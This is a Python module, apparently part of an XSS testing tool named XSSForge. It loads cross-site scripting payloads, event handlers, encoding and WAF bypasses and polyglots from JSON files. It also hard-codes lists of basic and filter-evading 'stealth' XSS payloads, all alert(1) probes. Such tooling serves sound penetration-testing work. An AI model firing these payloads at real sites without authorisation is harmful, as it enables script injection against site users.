"""
Payload loader for XSSForge.

Loads XSS payloads from the PortSwigger-based JSON database.
"""

import json
from pathlib import Path
from dataclasses import dataclass, field
from typing import Any


@dataclass
class EventHandler:
    """Represents an XSS event handler."""
    name: str
    description: str
    example: str
    category: str = ""


@dataclass
class TagPayload:
    """Represents an XSS tag-based payload."""
    tag: str
    payload: str
    auto_trigger: bool = False
    requires_close: bool = False
    blocked_common: bool = False
    note: str = ""


@dataclass
class BypassTechnique:
    """Represents a WAF bypass technique."""
    original: str
    bypass: str
    context: str = ""
    description: str = ""


@dataclass
class PayloadDatabase:
    """Complete payload database."""
    events: dict[str, list[EventHandler]] = field(default_factory=dict)
    auto_trigger_events: list[str] = field(default_factory=list)
    tags: dict[str, list[TagPayload]] = field(default_factory=dict)
    no_interaction_tags: list[str] = field(default_factory=list)
    commonly_blocked_tags: list[str] = field(default_factory=list)
    encoding_bypasses: dict[str, list[BypassTechnique]] = field(default_factory=dict)
    case_bypasses: dict[str, list[str]] = field(default_factory=dict)
    waf_specific: dict[str, list[dict]] = field(default_factory=dict)
    polyglots: list[str] = field(default_factory=list)
    context_specific: dict[str, list[str]] = field(default_factory=dict)


class PayloadLoader:
    """Loads and provides access to XSS payloads."""

    def __init__(self, data_dir: Path | None = None):
        if data_dir is None:
            data_dir = Path(__file__).parent / "data"
        self.data_dir = data_dir
        self._database: PayloadDatabase | None = None

    @property
    def database(self) -> PayloadDatabase:
        """Lazy load the payload database."""
        if self._database is None:
            self._database = self._load_database()
        return self._database

    def _load_json(self, filename: str) -> dict[str, Any]:
        """Load a JSON file from the data directory."""
        filepath = self.data_dir / filename
        if not filepath.exists():
            return {}
        with open(filepath, "r") as f:
            return json.load(f)

    def _load_database(self) -> PayloadDatabase:
        """Load the complete payload database."""
        db = PayloadDatabase()

        # Load events
        events_data = self._load_json("events.json")
        if "events" in events_data:
            for category, handlers in events_data["events"].items():
                db.events[category] = [
                    EventHandler(
                        name=h["name"],
                        description=h["description"],
                        example=h["example"],
                        category=category,
                    )
                    for h in handlers
                ]
        db.auto_trigger_events = events_data.get("auto_trigger_events", [])

        # Load tags
        tags_data = self._load_json("tags.json")
        if "tags" in tags_data:
            for category, payloads in tags_data["tags"].items():
                db.tags[category] = [
                    TagPayload(
                        tag=p["tag"],
                        payload=p["payload"],
                        auto_trigger=p.get("auto_trigger", False),
                        requires_close=p.get("requires_close", False),
                        blocked_common=p.get("blocked_common", False),
                        note=p.get("note", ""),
                    )
                    for p in payloads
                ]
        db.no_interaction_tags = tags_data.get("no_interaction_required", [])
        db.commonly_blocked_tags = tags_data.get("commonly_blocked", [])

        # Load bypasses
        bypass_data = self._load_json("bypasses.json")
        if "encoding_bypasses" in bypass_data:
            for enc_type, bypasses in bypass_data["encoding_bypasses"].items():
                db.encoding_bypasses[enc_type] = [
                    BypassTechnique(
                        original=b["original"],
                        bypass=b["bypass"],
                        context=b.get("context", ""),
                    )
                    for b in bypasses
                ]
        db.case_bypasses = bypass_data.get("case_bypasses", {})
        db.waf_specific = bypass_data.get("waf_specific", {})
        db.polyglots = bypass_data.get("polyglots", [])
        db.context_specific = bypass_data.get("context_specific", {})

        return db

    def get_all_events(self) -> list[EventHandler]:
        """Get all event handlers."""
        events = []
        for category_events in self.database.events.values():
            events.extend(category_events)
        return events

    def get_auto_trigger_events(self) -> list[str]:
        """Get events that auto-trigger without interaction."""
        return self.database.auto_trigger_events

    def get_events_by_category(self, category: str) -> list[EventHandler]:
        """Get events by category (mouse, keyboard, focus, etc.)."""
        return self.database.events.get(category, [])

    def get_all_tag_payloads(self) -> list[TagPayload]:
        """Get all tag-based payloads."""
        payloads = []
        for category_payloads in self.database.tags.values():
            payloads.extend(category_payloads)
        return payloads

    def get_auto_trigger_payloads(self) -> list[TagPayload]:
        """Get payloads that trigger automatically."""
        return [p for p in self.get_all_tag_payloads() if p.auto_trigger]

    def get_payloads_by_tag(self, tag: str) -> list[TagPayload]:
        """Get payloads for a specific tag."""
        results = []
        for payloads in self.database.tags.values():
            for p in payloads:
                if p.tag.lower() == tag.lower():
                    results.append(p)
        return results

    def get_polyglots(self) -> list[str]:
        """Get polyglot payloads that work in multiple contexts."""
        return self.database.polyglots

    def get_context_payloads(self, context: str) -> list[str]:
        """Get payloads for a specific context."""
        return self.database.context_specific.get(context, [])

    def get_waf_bypasses(self, waf: str) -> list[dict]:
        """Get bypass payloads for a specific WAF."""
        return self.database.waf_specific.get(waf.lower(), [])

    def get_encoding_bypasses(self, encoding_type: str) -> list[BypassTechnique]:
        """Get encoding-based bypasses."""
        return self.database.encoding_bypasses.get(encoding_type, [])

    def get_basic_payloads(self) -> list[str]:
        """Get a set of basic XSS payloads for initial testing."""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]

    def get_stealth_payloads(self) -> list[str]:
        """Get payloads designed to evade basic filters."""
        return [
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "<details/open/ontoggle=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<body onpageshow=alert(1)>",
            "'\"><svg/onload=alert(1)>",
        ]


# Global loader instance
_loader: PayloadLoader | None = None


def get_loader() -> PayloadLoader:
    """Get the global payload loader instance."""
    global _loader
    if _loader is None:
        _loader = PayloadLoader()
    return _loader
